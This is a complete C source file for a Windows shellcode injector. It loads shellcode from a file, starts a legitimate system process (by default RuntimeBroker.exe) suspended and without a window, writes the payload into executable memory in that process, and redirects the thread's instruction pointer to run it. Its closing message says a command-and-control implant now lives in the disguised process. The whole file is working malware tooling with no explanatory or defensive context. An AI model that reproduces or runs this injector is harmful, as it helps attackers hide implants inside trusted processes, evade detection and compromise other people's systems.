#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin> [target_exe]\n", argv[0]);
        return 1;
    }

    const char *sc_path = argv[1];
    const char *target  = argc > 2 ? argv[2]
                          : "C:\\Windows\\System32\\RuntimeBroker.exe";

    /* ---- 0. Read shellcode ---- */
    HANDLE hFile = CreateFileA(sc_path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (%lu)\n", sc_path, GetLastError());
        return 1;
    }
    DWORD sc_len = GetFileSize(hFile, NULL);
    LPVOID sc_buf = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
    DWORD nread;
    ReadFile(hFile, sc_buf, sc_len, &nread, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %lu bytes from %s\n", sc_len, sc_path);

    /* ---- 1. Create suspended process ---- */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Spawned %s  PID=%lu  TID=%lu (SUSPENDED)\n",
           target, pi.dwProcessId, pi.dwThreadId);

    /* ---- 2. Allocate RWX in remote process (any address) ---- */
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated %lu bytes at %p in PID %lu\n",
           sc_len, remote, pi.dwProcessId);

    /* ---- 3. Write shellcode ---- */
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remote, sc_buf, sc_len, &written);
    printf("[+] Wrote %llu bytes\n", (unsigned long long)written);

    /* ---- 4. Redirect thread RIP to shellcode via SetThreadContext ---- */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    printf("[+] Original RIP: 0x%llx\n", (unsigned long long)ctx.Rip);

    ctx.Rip = (DWORD64)remote;
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] Redirected RIP to shellcode at %p\n", remote);

    /* ---- 5. Resume ---- */
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed. Shellcode executing in PID %lu\n",
           pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(sc_buf, 0, MEM_RELEASE);

    printf("[*] Injector exiting. C2 lives in %s (PID %lu)\n",
           target, pi.dwProcessId);
    return 0;
}
